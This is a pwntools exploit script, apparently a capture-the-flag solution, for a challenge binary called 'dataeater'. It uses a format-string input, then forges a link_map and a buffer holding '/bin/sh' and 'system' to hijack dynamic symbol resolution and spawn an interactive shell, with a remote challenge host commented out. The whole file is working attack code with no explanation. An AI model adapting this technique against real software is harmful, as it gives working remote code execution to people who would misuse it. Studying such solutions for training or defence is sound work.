from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = context.binary = ELF("./dataeater", checksec=False)

elf = ELF("./dataeater")
lhost, lport = "localhost", 31337
rhost, rport = "mc.ax", 31869

link_map = p64(0) * 13
link_map += p64(elf.sym['buf'] + 8)[:-1]

buf_data = fit({
        0: b"/bin/sh\x00",
        8: flat(5, elf.sym['buf']),
        55: b'system\x00'
        }, filler = b"\x00")

p = process(elf.path)
#p = remote(rhost, rport)
gdb.attach(p, gdbscript="b *main+164")

payload = b'%s%32$s'

p.sendline(payload)

p.sendline(buf_data + b" " + link_map)

p.interactive()